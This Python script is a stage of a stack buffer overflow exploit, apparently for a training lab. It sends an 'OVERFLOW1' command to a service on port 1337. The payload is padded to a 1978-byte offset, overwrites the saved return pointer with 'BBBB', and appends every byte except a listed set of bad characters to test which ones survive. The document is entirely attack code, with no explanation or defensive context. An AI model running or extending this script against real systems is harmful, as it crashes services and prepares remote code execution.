#! /usr/bin/python
import socket, time, sys

host = "10.10.157.191"
port = 1337
t = 5
offset = 1978
length = 4000

badchars = [0x00, 0x0A, 0x0D, 0x07, 0x08, 0x2E, 0x2F, 0xA0, 0xA1]
probchars = ""
for i in range(0x00, 0xFF + 1):
    if i not in badchars:
        probchars += chr(i)

print("len of prob chars is {}".format(len(probchars)))

shellcode = ""
shellcode += "A" * offset
shellcode += "BBBB" #Saved Return Pointer
shellcode += probchars #ESP
shellcode += "D" * (length - len(shellcode))

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.settimeout(t)
    con = soc.connect((host, port))
    soc.recv(1024)
    print("Fuzzing with {} with length {}".format(shellcode, len(shellcode)))
    soc.send("OVERFLOW1 {}\r\n".format(shellcode)) #Change Command
    soc.recv(1024)
    soc.close()
except Exception as e:
    print(str(e))
    sys.exit(0)
